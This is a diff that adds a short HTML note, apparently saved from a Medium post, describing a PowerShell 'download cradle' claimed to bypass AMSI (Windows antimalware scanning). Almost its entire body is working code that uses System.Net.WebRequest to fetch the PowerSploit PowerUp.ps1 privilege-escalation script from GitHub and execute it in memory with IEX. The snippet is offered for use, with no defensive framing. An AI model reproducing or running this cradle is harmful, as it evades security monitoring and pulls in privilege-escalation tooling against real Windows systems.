@@ -1,0 +1,16 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>System.Net.WebRequest</title>
+</head><body>https://medium.com/@gamer.skullie/bypassing-amsi-with-an-unconventional-powershell-cradle-6bd15a17d8b9<br/>
+<br/>
+I thought to try it by using some other .NET classes other than Net.WebClient. I found System.Net.WebRequest class. This also works as an AMSI bymass (at the time of writing). <br/>
+<br/>
+<br/>
+$webreq = [System.Net.WebRequest]::Create(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1’)<br/>
+$resp=$webreq.GetResponse()<br/>
+$respstream=$resp.GetResponseStream()<br/>
+$reader=[System.IO.StreamReader]::new($respstream)<br/>
+$content=$reader.ReadToEnd()<br/>
+IEX($content)</body></html>
